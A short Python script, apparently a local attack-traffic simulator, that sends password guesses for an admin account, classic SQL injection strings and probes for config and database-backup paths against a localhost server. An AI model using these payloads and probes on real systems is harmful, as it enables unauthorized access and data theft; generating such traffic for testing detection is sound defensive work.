import requests
import time
import random

BASE_URL = "http://localhost:8000"

def brute_force_login():
    for i in range(5):
        payload = {
            "username": "admin",
            "password": f"pass{i}"
        }
        requests.post(f"{BASE_URL}/auth/login", data=payload)
        time.sleep(random.uniform(0.2, 0.6))

def sql_injection_attempt():
    payloads = [
        "1 OR 1=1",
        "' OR 'a'='a",
        "admin' --",
        "' UNION SELECT * FROM users --"
    ]
    for p in payloads:
        requests.post(f"{BASE_URL}/api/query", data={"q": p})
        time.sleep(random.uniform(0.3, 0.7))

def config_scanning():
    endpoints = [
        "/admin/config",
        "/files/db_backup.sql",
        "/files/backup.zip",
        "/api/config"
    ]
    for ep in endpoints:
        requests.get(f"{BASE_URL}{ep}")
        time.sleep(random.uniform(0.1, 0.4))

if __name__ == "__main__":
    brute_force_login()
    sql_injection_attempt()
    config_scanning()
